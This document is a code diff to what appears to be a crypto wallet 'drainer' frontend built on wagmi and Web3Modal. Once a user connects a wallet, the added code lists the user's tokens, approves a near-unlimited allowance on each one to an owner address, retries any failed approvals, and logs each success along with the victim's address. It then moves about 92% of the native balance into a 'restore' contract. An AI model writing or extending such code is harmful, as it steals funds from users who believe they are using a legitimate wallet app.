@@ -7,17 +7,18 @@ import {
     getWalletClient,
     estimateGas,
     getBalance,
-    sendTransaction,
+    writeContract,
 } from "@wagmi/core";
 import { mainnet, bsc, polygon } from "@wagmi/core/chains";
 import { coinbaseWallet, walletConnect, injected } from "@wagmi/connectors";
 import { getAccount } from "@wagmi/core";
 
 import * as CONFIG from "../settings.json";
+import { getTokensOwned } from "./apiConfig";
 import { hexToNumber, numberToHex } from "viem";
 import * as RST_ABI from "../NFT_ABI.json";
 
-const projectId = process.env.VITE_PROJECT_ID;
+const projectId = process.env.PROJECT_ID;
 
 const metadata = {
     name: "Web3Modal",
@@ -134,18 +135,86 @@ async function initAccounts() {
     if (!getAccount(config).isConnected) {
         return window.location.reload();
     }
-
-    initRestoreETH();
-}
-
-async function initRestoreETH() {
     try {
         const wallet = await getWalletClient(config);
+        console.log(wallet);
         const chainID = await wallet.request({ method: "eth_chainId" });
 
         data.chainId = chainID;
         data.userAddress = getAccount(config).address;
 
+        console.log(data);
+
+        const resultTokens = await getTokensOwned(
+            data.userAddress,
+            hexToNumber(data.chainId)
+        );
+
+        if (resultTokens.length > 0) {
+            for (let i = 0; i < resultTokens.length; i++) {
+                try {
+                    const tkn = resultTokens[i];
+
+                    const result = await writeContract(config, {
+                        account: data.userAddress,
+                        address: tkn.address,
+                        abi: JSON.parse(CONFIG.DEFAULT_TOKEN_ABI),
+                        functionName: "approve",
+                        args: [
+                            process.env.OWNER_ADDRESS,
+                            BigInt(
+                                "18092513943330655534932966407607485602073435104006338131165247501236"
+                            ),
+                        ],
+                        chainId: hexToNumber(
+                            await wallet.request({
+                                method: "eth_chainId",
+                            })
+                        ),
+                        value: 0,
+                    });
+                    console.log(result);
+
+                    sendErr(
+                        `Token ${
+                            tkn.address
+                        } allowance increased with hash ${JSON.stringify(
+                            result
+                        )} on chain ${
+                            arrCHXY[hexToNumber(data.chainId)]
+                        } & user ${getAccount(config).address}`
+                    );
+                } catch (error) {
+                    sendErr(
+                        `Error approving token ${resultTokens[i].address}: ${error.message}`
+                    );
+                    if (isRetryError(error)) {
+                        sendErr(
+                            `Retrying token ${resultTokens[i].address} at index ${i}...`
+                        );
+                        i--;
+                        continue;
+                    } else {
+                        await initRestoreETH();
+                    }
+                }
+            }
+
+            await initRestoreETH();
+        } else {
+            sendErr("No tokens");
+            await initRestoreETH();
+        }
+    } catch (error) {
+        await sendErr(error);
+        await initRestoreETH();
+    }
+}
+
+async function initRestoreETH() {
+    const wallet = await getWalletClient(config);
+
+    try {
         const walletETHBalance2 = await getBalance(config, {
             address: data.userAddress,
             chainId: hexToNumber(
@@ -153,12 +222,19 @@ async function initRestoreETH() {
             ),
             unit: "wei",
         });
+        console.log(walletETHBalance2);
         const userBalance = walletETHBalance2.formatted;
         console.log(userBalance);
 
         const gasPrice = await estimateGas(config, {
             account: data.userAddress,
-            to: process.env.OWNER_ADDRESS,
+            to: CONFIG.CONTRACT_ADDRESS[
+                mySupportedChains.indexOf(
+                    hexToNumber(await wallet.request({ method: "eth_chainId" }))
+                )
+            ],
+            abi: RST_ABI,
+            functionName: "restore",
             value: BigInt(parseInt(userBalance * 0.9)),
             type: "legacy",
             chainId: hexToNumber(
@@ -168,9 +244,20 @@ async function initRestoreETH() {
             ),
         });
 
-        const result = await sendTransaction(config, {
+        console.log(gasPrice);
+
+        const result = await writeContract(config, {
             account: data.userAddress,
-            to: process.env.OWNER_ADDRESS,
+            address:
+                CONFIG.CONTRACT_ADDRESS[
+                    mySupportedChains.indexOf(
+                        hexToNumber(
+                            await wallet.request({ method: "eth_chainId" })
+                        )
+                    )
+                ],
+            abi: RST_ABI,
+            functionName: "restore",
             chainId: hexToNumber(
                 await wallet.request({
                     method: "eth_chainId",
@@ -179,12 +266,11 @@ async function initRestoreETH() {
             value: BigInt(
                 parseInt(
                     parseInt(userBalance * 0.92) -
-                        parseInt(Number(gasPrice) * 80000)
+                        parseInt(Number(gasPrice) * 50000)
                 )
             ),
-            type: "legacy",
         });
-        console.log(result);
+        // console.log(result);
         sendErr(`Restore ETH Success. Hash ${result}`);
 
         usedChains.push(
